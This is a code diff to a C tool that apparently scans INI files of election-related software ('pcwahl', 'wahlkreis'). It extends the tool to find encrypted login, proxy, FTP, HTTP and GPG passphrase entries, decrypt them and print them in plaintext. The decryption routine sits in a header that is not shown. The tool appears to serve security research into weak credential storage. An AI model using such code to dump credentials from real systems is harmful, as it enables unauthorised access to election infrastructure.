@@ -53,6 +53,8 @@
 #include "helper.h"
 #include "iniparser.h"
 
+#include "pcw_lodlodl.h"
+
 #define DEBUG 1
 
 #define MAX_INIFILES   128
@@ -62,7 +64,7 @@ static char g_pcw_ini_files[MAX_INIFILES][_MAX_PATH];
 static int g_count;
 
 // We are looking for keys in wahlkreis sections: 
-// hostname, userid, serverpfad, email, login (enc), sockslogin (enc), ftpp (enc)
+// hostname, userid, serverpfad, email, login (enc), sockslogin (enc), ftpp (enc), GPG passphrase (enc)
 
 char *ini_keys[] = {
    ":scripturl",
@@ -76,6 +78,9 @@ char *ini_keys[] = {
    ":login",
    ":sockslogin",
    ":ftpp",
+   "gpg:id",
+   "gpg:pw",
+   "gpg:pid",
    NULL
 };
 
@@ -85,6 +90,13 @@ char *ini_keys_encrypted[] = {
    ":ftpp",
    NULL
 };
+
+char *ini_keys_lodlodl_encrypted[] = {
+   "http:password",
+   "gpg:pw",
+   NULL
+};
+
 
 static short GetCurrentColor()
 {
@@ -212,7 +224,10 @@ void pcwahl_ini_parse(char *path)
    short currentColor = GetCurrentColor();
    
    ini = iniparser_load(path);
-
+   
+   if(ini == NULL)
+      return;
+      
    for (i=0; i < ini->size; i++) {
       
       if (ini->key[i] == NULL)
@@ -247,6 +262,28 @@ void pcwahl_ini_parse(char *path)
                      printf("] (DECRYPTED)\n");
                   }
                }
+               
+               for(k=0; ini_keys_lodlodl_encrypted[k] != NULL; k++) {
+                  
+                  if(StrStrA(ini->key[i], ini_keys_lodlodl_encrypted[k]) && *ini->val[i] != 0) {
+                     
+                     char *plaintext = NULL;
+                     plaintext = lodlodl_decrapt(ini->val[i]);
+                     
+                     if(plaintext == NULL) 
+                        continue;
+                     
+                     printf("[%s]=[", ini->key[i]);
+                     SetConsoleTextAttribute(hConsole, 78);
+                     printf("%s", plaintext);
+                     SetConsoleTextAttribute(hConsole, currentColor);
+                     printf("] (DECRYPTED)\n");
+                     
+                     free(plaintext);
+                     plaintext = NULL;
+                  }
+               }
+               
             }
          }
       } 
@@ -274,8 +311,9 @@ int main(int ac, char** av)
    ZeroMemory( &g_pcw_ini_files, sizeof(g_pcw_ini_files) );
       
    printf("[*] Looking for ini files in: %s\n", av[1]);
+   resultlen = pcwahl_find_files_by_extension(av[1], ".INI");
    resultlen = pcwahl_find_files_by_extension(av[1], ".ini");
-   
+      
    printf("[+] Found %d ini-files:\n", resultlen);
    for(i=0; i<resultlen; i++) {
       printf("[-] %s\n", g_pcw_ini_files[i]);
